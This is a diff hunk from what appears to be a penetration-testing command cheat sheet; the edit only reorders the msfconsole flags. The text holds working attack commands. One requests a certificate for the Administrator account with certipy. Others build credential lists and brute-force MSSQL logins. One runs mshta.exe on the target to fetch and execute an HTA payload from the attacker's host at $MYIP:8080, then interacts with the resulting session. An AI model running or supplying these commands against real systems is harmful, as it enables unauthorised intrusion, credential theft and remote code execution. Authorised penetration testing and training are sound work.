@@ -416,9 +416,9 @@ certipy-ad req -target '$DC' -ca '$CA' -upn 'Administrator' -template 'RetroClie
 [*] (1433) MSSQL
 cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mssqlusernames
 cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f2 | sort -u > /tmp/mssqlpasswords
-msfconsole -x -q "use auxiliary/admin/mssql/mssql_enum; set RHOSTS $TARGET; run;"
-msfconsole -x -q "use auxiliary/scanner/mssql/mssql_login; set RHOSTS $TARGET; set USER_FILE /tmp/mssqlusernames; set PASS_FILE /tmp/mssqlpasswords; run;"
-msfconsole -x -q "use auxiliary/admin/mssql/mssql_exec; set RHOSTS $TARGET; set CMD mshta.exe http://$MYIP:8080/nZzLAD.hta; set USERNAME $USERNAME; set PASSWORD $PASSWORD; run;"
+msfconsole -q -x "use auxiliary/admin/mssql/mssql_enum; set RHOSTS $TARGET; run;"
+msfconsole -q -x "use auxiliary/scanner/mssql/mssql_login; set RHOSTS $TARGET; set USER_FILE /tmp/mssqlusernames; set PASS_FILE /tmp/mssqlpasswords; run;"
+msfconsole -q -x "use auxiliary/admin/mssql/mssql_exec; set RHOSTS $TARGET; set CMD mshta.exe http://$MYIP:8080/nZzLAD.hta; set USERNAME $USERNAME; set PASSWORD $PASSWORD; run;"
 sessions -i 1
 
 [*] (2049) NFS
